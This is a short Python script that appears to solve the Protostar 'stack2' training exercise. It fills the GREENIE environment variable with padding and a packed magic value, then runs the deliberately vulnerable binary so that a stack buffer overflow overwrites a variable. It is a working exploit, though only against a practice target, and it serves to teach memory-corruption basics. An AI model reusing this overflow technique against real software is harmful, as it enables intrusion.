#!/usr/bin/env python
import subprocess
import os
import struct

path = "/opt/protostar/bin/stack2"
padding = "A"*(0x58-0x18)
var = struct.pack("<I", 0xd0a0d0a)
env = os.environ.copy()
env["GREENIE"] = padding+var

process = subprocess.Popen([path], stdin=subprocess.PIPE, env=env)